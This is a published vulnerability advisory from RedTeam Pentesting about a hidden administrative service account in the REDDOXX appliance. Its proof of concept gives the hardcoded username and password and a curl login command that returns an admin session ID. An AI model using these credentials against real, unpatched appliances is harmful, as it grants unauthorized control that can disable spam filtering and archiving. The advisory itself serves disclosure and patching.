Subject: [RT-SA-2017-007] Undocumented Administrative Service Account in
 REDDOXX Appliance

Advisory: Undocumented Administrative Service Account in REDDOXX Appliance

RedTeam Pentesting discovered an undocumented service account in the
REDDOXX appliance software, which allows attackers to access the
administrative interface of the appliance and change its configuration.


Details
=======

Product: REDDOXX Appliance
Affected Versions: Build 2032 / v2.0.625, older versions likely affected too
Fixed Versions: Version 2032 SP2
Vulnerability Type: Hidden Service Account
Security Risk: high
Vendor URL: https://www.reddoxx.com/
Vendor Status: patch available
Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2017-007
Advisory Status: published
CVE: GENERIC-MAP-NOMATCH
CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=GENERIC-MAP-NOMATCH

(from the vendor's homepage)


More Details
============

Through the ISO provided on the vendor's homepage [1], it was possible
to analyze the files in a typical REDDOXX appliance [0] installation. As
part of this process, hardcoded credentials for a service account were
found in a .NET binary file. With these credentials, it was possible to
authenticate against the administrative interface.


Proof of Concept
================

The following curl command-line shows an unsuccessful login attempt with
invalid credentials against the administrative interface:

------------------------------------------------------------------------
$ curl --silent -H 'Content-Type: application/json' --data '{"UserName": "redteam@...al", "Password":"redteam"}' http://www.example.com/api/v1/proxy/auth/credentials | jq .
{
  "ResponseStatus": {
    "ErrorCode": "Unauthorized",
    "Message": "Invalid UserName or Password",
    "Errors": []
  }
}
------------------------------------------------------------------------


When the credentials extracted from the binaries are provided however,
the webserver returns a session ID instead of an error message,
indicating a successful login:

------------------------------------------------------------------------
$ curl --silent -H 'Content-Type: application/json' --data '{"UserName": "rdx-build-in-service-user@...al", "Password":"rdx!1ntern4l"}' http://www.example.com/api/v1/proxy/auth/credentials | jq .
{
  "SessionId": "Qm5odfSFB2tVh8De6HjD",
  "UserName": "rdx-build-in-service-user@...al",
  "DisplayName": "",
  "ResponseStatus": {}
}
------------------------------------------------------------------------


Workaround
==========

None


Fix
===

Update the appliance software to Version 2032 SP2.


Security Risk
=============

The hidden service account allows attackers to authenticate to the
administrative interface of the appliance. With this level of access,
the appliance can be completely reconfigured. For example, core
functionalities, such as spam filtering or archiving, can be disabled.
RedTeam Pentesting assumes that the hidden service account is present
on all REDDOXX installations and rates its presence as a high risk.
